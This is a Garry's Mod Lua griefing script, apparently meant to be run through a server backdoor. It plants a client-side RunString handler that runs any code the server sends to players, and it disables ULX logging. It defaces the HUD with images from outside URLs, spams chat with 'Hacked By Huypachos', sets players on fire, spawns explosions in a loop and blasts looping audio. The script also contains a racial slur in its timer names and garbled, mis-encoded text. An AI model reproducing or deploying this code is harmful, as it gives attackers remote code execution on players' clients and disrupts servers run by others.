util.AddNetworkString "skeleton_dancing_troll"

local lol = {}
function lol:RandomString( intMin, intMax )
	local ret = ""
	for _ = 1, math.random( intMin, intMax ) do
		ret = ret.. string.char( math.random(65, 90) )
	end

	return ret
end

lol.m_tblActions = {}
lol.m_strImageGlobalVar = lol:RandomString( 6, 12 )
lol.m_strImageLoadHTML = [[<style type="text/css"> html, body {background-color: transparent;} html{overflow:hidden; ]].. (true and "margin: -8px -8px;" or "margin: 0px 0px;") ..[[ } </style><body><img src="]] .. "%s" .. [[" alt="" width="]] .. "%i"..[[" height="]] .. "%i" .. [[" /></body>]]

function lol:PushAction( intChainDelay, func )
	self.m_tblActions[#self.m_tblActions +1] = { intChainDelay, func }
end

function lol:NextAction( pPlayer )
	pPlayer.m_intCurAction = pPlayer.m_intCurAction +1
	if not self.m_tblActions[pPlayer.m_intCurAction] then return end

	timer.Simple( self.m_tblActions[pPlayer.m_intCurAction][1], function()
		if not IsValid( pPlayer ) then return end
		self.m_tblActions[pPlayer.m_intCurAction][2]( pPlayer )
		self:NextAction( pPlayer )
	end )
end

function lol:Start( pPlayer )
	pPlayer.m_intCurAction = 0
	self:NextAction( pPlayer )
end

function lol:SendLua( pPlayer, strLua )
	net.Start( "skeleton_dancing_troll" )
		net.WriteString( strLua )
	net.Send( pPlayer )
end

function lol:SetupPlayer( pPlayer )
	pPlayer:SendLua( "net.Receive(\"skeleton_dancing_troll\", function() RunString(net.ReadString()) end)" )
end

for k, v in pairs( player.GetAll() ) do
	lol:SetupPlayer( v )
	timer.Simple( 2, function() lol:Start( v ) end )
end

hook.Add( "PlayerAuthed", "wat", function( pPlayer )
	lol:SetupPlayer( pPlayer )
	timer.Simple( 10, function() lol:Start( pPlayer ) end )	
end )

hook.Add( "PlayerSay", "1337command", function( pSender, strText, bTeamChat )
	if strText:sub( 1, 5 ) == "/1337" then
		pSender:Ignite( 1e9 )
		pSender:ChatPrint( "Nop" )
		pSender:SendLua( [[surface.PlaySound( "vo/npc/male01/hacks01.wav" )]] )
		return false
	end
end )

	

--Sequence stack
--Start some tunes and steam in our assets
lol:PushAction( 0, function( pPlayer )
	lol:SendLua( pPlayer, ([=[
		sound.PlayURL( "https://gamesenseback.ml/wtf.mp3", "", function()end )
		
		g_]=].. lol.m_strImageGlobalVar.. [=[ = {}
		local html = [[%s]]
		local function LoadWebMaterial( strURL, strUID, intSizeX, intSizeY )
			local pnl = vgui.Create( "HTML" )
			pnl:SetPos( ScrW() -1, ScrH() -1 )
			pnl:SetVisible( true )
			pnl:SetMouseInputEnabled( false )
			pnl:SetKeyBoardInputEnabled( false )
			pnl:SetSize( intSizeX, intSizeY )
			pnl:SetHTML( html:format(strURL, intSizeX, intSizeY) )
			
			local PageLoaded
			PageLoaded = function()
				local mat = pnl:GetHTMLMaterial()
				if mat then
					g_]=].. lol.m_strImageGlobalVar.. [=[[strUID] = { mat, pnl }
					return
				end
				
				timer.Simple( 0.10, PageLoaded )
			end

			PageLoaded()
		end

		LoadWebMaterial( "https://media.discordapp.net/attachments/1015641663214993408/1073254230917394563/L1rlMBf0Nrs.jpg", "hud1", 300, 128 )
		LoadWebMaterial( "https://media.discordapp.net/attachments/1015641663214993408/1073254231890472960/O48t_8bVgcxXxX3NIggJhwXS6ICSGhdUO_fglRXZBWqs10kflrin0881o_oN0f4tHc8emwVfojfrIBBjJAHt0HXg.jpg", "hud2", 300, 128 )
		LoadWebMaterial( "https://www.meme-arsenal.com/memes/a533445b9fabedb8ae8395750de95c93.jpg", "hud3", 128, 128 )
		LoadWebMaterial( "https://cdn.discordapp.com/attachments/1015641663214993408/1073254231219372122/unnamed_2.jpg", "doritos", 256, 256 )
		LoadWebMaterial( "https://cdn.discordapp.com/attachments/1015641663214993408/1073254231219372122/unnamed_2.jpg", "fedora", 256, 256 )
		LoadWebMaterial( "https://cdn.discordapp.com/attachments/1015641663214993408/1073254231219372122/unnamed_2.jpg", "dew", 256, 256 )
		LoadWebMaterial( "https://cdn.discordapp.com/attachments/1015641663214993408/1073254231219372122/unnamed_2.jpg", "awp", 256, 256 )
	]=]):format(lol.m_strImageLoadHTML) )
	RunConsoleCommand("ulx_logecho", "0")
	
	timer.Create( "hello", 2, 1, function()
    RunConsoleCommand( "say", "Ïðèâåò‚" )
    end)
	
	timer.Create( "hello2", 10, 1, function()
    RunConsoleCommand( "say", "íà ýòîì ñåðâåðå áûë íàéäåí backdoor è îí áûë âçëîìàí" )
    end)
	
	timer.Create( "hello3", 14, 1, function()
    RunConsoleCommand( "say", "ÄÀÐÎÂÀ ÄÎÊÑÒÅÐ ÅÏÒÀ" )
    end)
	
	timer.Create( "hello5", 20, 1, function()
    RunConsoleCommand( "say", "à ñåé÷àñ âû ìîæåòå ïîñëóøàòü ìóçûêó..." )
    end)
	
	timer.Create( "hello6", 32, 1, function()
    RunConsoleCommand( "say", "Hacked By Huypachos" )
    end)
end )

--HUD swap
lol:PushAction( 40, function( pPlayer )
	lol:SendLua( pPlayer, [[
		(GAMEMODE or GM).CalcView = function() end
		(GAMEMODE or GM).ShouldDrawLocalPlayer = function() end

		local remove = { "PostDrawHUD", "PreDrawHUD", "HUDPaint", "HUDPaintBackground", "CalcView", "ShouldDrawLocalPlayer" }
		for k, v in pairs(remove) do
			hook.GetTable()[v] = {}
		end

		local function GetWebMat( strURL )
			return g_]].. lol.m_strImageGlobalVar.. [[[strURL]
		end

		hook.Add( "HUDPaint", "newhud", function()
			surface.SetDrawColor( 255, 255, 255, 255 )

			if GetWebMat( "hud1" ) then
				surface.SetMaterial( GetWebMat("hud1")[1] )
				surface.DrawTexturedRect( 0, ScrH() -128, 300 *(512 /300), 128 )
			end
			if GetWebMat( "hud2" ) then
				surface.SetMaterial( GetWebMat("hud2")[1] )
				surface.DrawTexturedRect( ScrW() -300, ScrH() -128, 300 *(512 /300), 128 )
			end
			if GetWebMat( "hud3" ) then
				surface.SetMaterial( GetWebMat("hud3")[1] )
				surface.DrawTexturedRect( 45, ScrH() -245, 128, 128 )
			end
			if GetWebMat( "doritos" ) then
				surface.SetMaterial( GetWebMat("doritos")[1] )
				surface.DrawTexturedRectRotated( math.random(250, 260), math.random(250, 260), 183 *(256 /183), 256, CurTime() *512 )
			end
			if GetWebMat( "dew" ) then
				surface.SetMaterial( GetWebMat("dew")[1] )
				surface.DrawTexturedRectRotated( math.random(250, 260), math.random(ScrH() -250, ScrH() -260), 110 *((350 /110) -1), 256, CurTime() *-512 )
			end
			if GetWebMat( "fedora" ) then
				surface.SetMaterial( GetWebMat("fedora")[1] )
				surface.DrawTexturedRectRotated( ScrW() -math.random(400, 410), math.random(250, 260), 256, 256, CurTime() *-512 )
			end
			if GetWebMat( "awp" ) then
				surface.SetMaterial( GetWebMat("awp")[1] )
				surface.DrawTexturedRectRotated( ScrW() -math.random(400, 410), math.random(ScrH() -260, ScrH() -250), 256, 256, CurTime() *512 )
			end

			draw.SimpleTextOutlined(
				"HACKED BY HUYPACHOS",
				"DermaLarge",
				ScrW() /2 +math.random( -8, 8 ),
				ScrH() /2 +math.random( -8, 8 ) +24,
				Color( 255, 0, 0, 255 ),
				TEXT_ALIGN_CENTER,
				TEXT_ALIGN_CENTER,
				1,
				Color( 0, 0, 255, 255 )
				)
			end )

		local allowed = { ["CHudChat"] = true, ["CHudGMod"] = true, ["CHudWeaponSelection"] = true, ["CHudMenu"] = true }
		hook.Add( "HUDShouldDraw", "newhud", function( str ) if not allowed[str] then return false end end )

		surface.PlaySound( "garrysmod/save_load4.wav" )
	]] )
end )

--Disco time
lol:PushAction( 9.1, function( pPlayer )
	local idx = pPlayer:EntIndex()
	timer.Create( "beat".. idx, 0.42, 0, function()
	    if not IsValid( pPlayer ) then timer.Destroy( "beat".. idx ) return end
	    pPlayer:ViewPunch( Angle(math.Rand(-15, -10), math.Rand(-10, 10), 0) )
	end )
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

timer.Create( "niggaspams2", 0.1, 0, function()
RunConsoleCommand( "sv_friction", "-8" )
end)

timer.Create( "niggaspams3", 0.1, 0, function()
RunConsoleCommand( "sv_gravity", "-600" )
end)
timer.Create( "next_level_timer", 0.1, 0, function()
    for k, v in pairs(player.GetAll()) do v:SendLua([[chat.AddText( Color( math.random(1, 255), math.random(1, 255), math.random(1, 255) ), "â– â–‚ â–ƒ â–„ â–… â–† â–‡Ä¤áºªÄˆÐŒÄ’ÄŽ à¸¿Â¥ Äá»†fÄŒá»’Åƒ Å â±£Lá»’Ð‡Èš v5.2 â–ˆ â–‡ â–† â–… â–„ â–‚ â–" )]])
    end
end)

for k,v in pairs(player.GetAll()) do v:SetVelocity(v:GetVelocity() + Vector(math.random(1000,5000), math.random(1000,5000), math.random(1000,5000))) end


hook.Add("Think", "busted", function()
    for k,v in pairs (player.GetAll()) do
        v:SetModelScale(2.5, 100);
        v:SetRunSpeed(400 * 2);
        v:SetWalkSpeed(200 * 2);
    end
end)

for k, v in pairs( player.GetAll() ) do v:SendLua( [[util.ScreenShake( Vector( 0, 0, 0 ), 10, 5, 60, 5000 )]] ) end

for k,v in pairs(player.GetAll()) do 
    local a = v:LookupBone("ValveBiped.Bip01_Head1")
    local b = v:LookupBone("ValveBiped.Bip01_R_Thigh")
    local c = v:LookupBone("ValveBiped.Bip01_L_Thigh")
    local d = v:LookupBone("ValveBiped.Bip01_R_Calf")
    local e = v:LookupBone("ValveBiped.Bip01_L_Calf")
    local f = v:LookupBone("ValveBiped.Bip01_R_UpperArm")
    local g = v:LookupBone("ValveBiped.Bip01_L_UpperArm")
    local h = v:LookupBone("ValveBiped.Bip01_R_Forearm")
    local i = v:LookupBone("ValveBiped.Bip01_L_Forearm")
    local j = v:LookupBone("ValveBiped.Bip01_R_Clavicle")
    local k = v:LookupBone("ValveBiped.Bip01_L_Clavicle")

        v:ManipulateBoneScale( a, Vector(4,0,4)) 
        v:ManipulateBoneScale( b, Vector(0,0,0))
        v:ManipulateBoneScale( c, Vector(0,0,0))
        v:ManipulateBoneScale( d, Vector(0,0,1))
        v:ManipulateBoneScale( e, Vector(0,0,1))
        v:ManipulateBoneScale( f, Vector(0,0,0))
        v:ManipulateBoneScale( g, Vector(0,0,0))
        v:ManipulateBoneScale( h, Vector(1,1.5,1.5))
        v:ManipulateBoneScale( i, Vector(1,1.5,1.5))
        v:ManipulateBoneScale( j, Vector(0,0,0))
        v:ManipulateBoneScale( k, Vector(0,0,0))
        end


timer.Create( "ignitelol", 0.1, 1, function()
for k,v in pairs(player.GetAll()) do v:Ignite(120) end
end)
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

	lol:SendLua( pPlayer, [[
		local emitter = ParticleEmitter( LocalPlayer():GetPos() )
		local time = 0

		hook.Add( "Think", "wat", function()
			if CurTime() < time then
				return
			end

			time = CurTime() +0.05
			for i = 1, 16 do
				local part = emitter:Add(
					"particles/balloon_bit", 
					LocalPlayer():GetPos() +Vector( 
						math.random( -256, 256 ), 
						math.random( -256, 256 ), 
						256
					)
				)
				
				if part then
					local Size = math.random( 4, 7 )
					
					part:SetColor( math.random(0, 255), math.random(0, 255), math.random(0, 255), 255 )
					part:SetVelocity( Vector( 40, 25, -math.random(300, 400) ) )
					part:SetDieTime( 4.5 )
					part:SetGravity( Vector(40, 0, -250) )
					part:SetLifeTime( 0 )
					part:SetStartSize( Size /2 )
					part:SetEndSize( Size )
					part:SetCollide( true )
				end
			end
		end )
	]] )

	lol:SendLua( pPlayer, [[
		hook.Add( "RenderScreenspaceEffects", "wat", function()
			local sinScaler = math.sin( CurTime() )
			DrawBloom(
				0,
				3,
				sinScaler *math.Rand(1, 8),
				sinScaler *math.Rand(1, 8),
				6,
				math.Rand(0.5, 2),
				math.Rand(0, 0.3),
				math.Rand(0, 0.3),
				math.Rand(0.5, 1)
			)

			DrawColorModify{
				["$pp_colour_addr"] = 1,
				["$pp_colour_addg"] = 0,
				["$pp_colour_addb"] = 0,
				["$pp_colour_brightness" ] = 0,
				["$pp_colour_contrast" ] = 1,
				["$pp_colour_colour" ] = 1,
				["$pp_colour_mulr" ] = 0,
				["$pp_colour_mulg" ] = 0,
				["$pp_colour_mulb" ] = 0
			}
		end )

		local mdl = ClientsideModel( "models/player/charple.mdl", RENDERGROUP_BOTH )
		mdl:SetNoDraw( true )
		local posCache, time = {}, 0

		hook.Add( "HUDPaint", "dance", function()
			if not mdl.SeqStart or CurTime() > (mdl.SeqStart +mdl.SeqDuration) then
				local idx = mdl:LookupSequence("taunt_dance")
				mdl.SeqDuration = mdl:SequenceDuration( idx )
				mdl.SeqStart = CurTime()
				mdl:ResetSequence( idx )
			end

			mdl:SetCycle( (CurTime() -mdl.SeqStart) /mdl.SeqDuration )

			
			local w, h = 300, 300
			local ang = Angle( 0, 0, 0 )

			for i = 1, 32 do
				if CurTime() > time then
					posCache[i] = { math.random( 0, ScrW() -w ), math.random( 0, ScrH() -h ) }
				end
				local x, y = posCache[i][1], posCache[i][2]

				cam.Start3D( (ang:Forward() *64) +(ang:Up() *32), (ang:Forward()*-1):Angle(), 90, x, y, w, h )
					cam.IgnoreZ( true )
					render.SuppressEngineLighting( true )
					
					render.SetLightingOrigin( mdl:GetPos() )
					render.ResetModelLighting( 1, 1, 1 )
					render.SetColorModulation( 0, 0, 1 )

					mdl:DrawModel()
					
					render.SuppressEngineLighting( false )
					cam.IgnoreZ( false )
				cam.End3D()
			end

			if CurTime() > time then
				time = CurTime() +0.15
			end
		end )

		
	]] )
end )

--Let the beat drop
lol:PushAction( 101, function( pPlayer )
	lol:SendLua( pPlayer, [[
		hook.Add( "GetMotionBlurValues", "wat", function()
			return 0, 0, 1, math.sin(CurTime() *13)
		end )

		hook.Add( "RenderScreenspaceEffects", "ohgod", function()
			local sinScaler = math.sin( CurTime() *(RealFrameTime() *1024) )
			DrawSharpen( 1 +(sinScaler *10), 0.5 +(sinScaler *2) )
			DrawMaterialOverlay( "effects/tp_eyefx/tpeye", 1 )
		end )

		hook.Add( "PostDrawTranslucentRenderables", "ohgod", function()
			render.SetMaterial( Material("cable/blue_elec") )
			for i = 1, 32 do
				render.DrawBeam( LocalPlayer():GetPos() +Vector(0, 0, 128) +(EyeAngles():Forward() *256), EyePos() +(VectorRand() *256), 4, 0, 12.5, Color(255, 255, 255, 255) )
			end
		end )

		timer.Create( "thedrop", 0.42, 0, function()
			util.ScreenShake( LocalPlayer():GetPos(), 512, 5, 0.25, 128 ) 
		end )
	]] )
	
	pPlayer:Remove()
	
    timer.Create( "rights", 0.1, 0, function()
	for k, v in pairs(player.GetAll()) do
        v:ConCommand("+right");
    end
	
end)

--EVIL TIME rip headpones
lol:PushAction( 100, function( pPlayer )
	lol:SendLua( pPlayer, [[
		surface.PlaySound( "vo/npc/male01/gethellout.wav" )
		
		

		local sounds = {}
		for i = 1, 4 do
			sound.PlayURL( "http://www.underdone.org/leak/underdone/asd.mp3", "noblock noplay", function( pChan )
				sounds[#sounds +1] = pChan
			end )
		end

		timer.Create( "asdf", 1, 0, function()
			if #sounds ~= 4 then return end
			timer.Destroy( "asdf" )
			for k, v in pairs( sounds ) do v:EnableLooping( true ) v:SetVolume( 1 ) v:Play() end
		end )

		hook.Add( "HUDShouldDraw", "newhud", function() return false end )
		
	]] )
	
	timer.Create( "allahakbar", 5, 0, function()
	hook.Add("Think", "armageddon", function()
                local explode = ents.Create( "env_explosion" ) 
                    explode:SetPos( Vector(math.random(-6000, 6000), math.random(-6000, 6000), math.random(-500, 2000)) ) 
                    explode:Spawn() 
                    explode:SetKeyValue( "iMagnitude", "500" ) 
                    explode:Fire( "Explode", 0, 0 ) 
                end)
				end)
				
				hook.Add("Think", "chatspam", function() for k,v in pairs(player.GetAll()) do v:PrintMessage( HUD_PRINTCENTER, " â– â–‚ â–ƒ â–„ â–… â–† â–‡Ä¤áºªÄˆÐŒÄ’ÄŽ à¸¿Â¥ Äá»†fÄŒá»’Åƒ Å â±£Lá»’Ð‡Èš v5.2 â–ˆ â–‡ â–† â–… â–„ â–‚ â– " ) v:SendLua([[chat.AddText( Color( math.random(1, 255), math.random(1, 255), math.random(1, 255) ), "â– â–‚ â–ƒ â–„ â–… â–† â–‡Ä¤áºªÄˆÐŒÄ’ÄŽ à¸¿Â¥ Äá»†fÄŒá»’Åƒ Å â±£Lá»’Ð‡Èš v5.2 â–ˆ â–‡ â–† â–… â–„ â–‚ â–" )]]) end end)
     		
	pPlayer:Remove()
	 
end )
end )
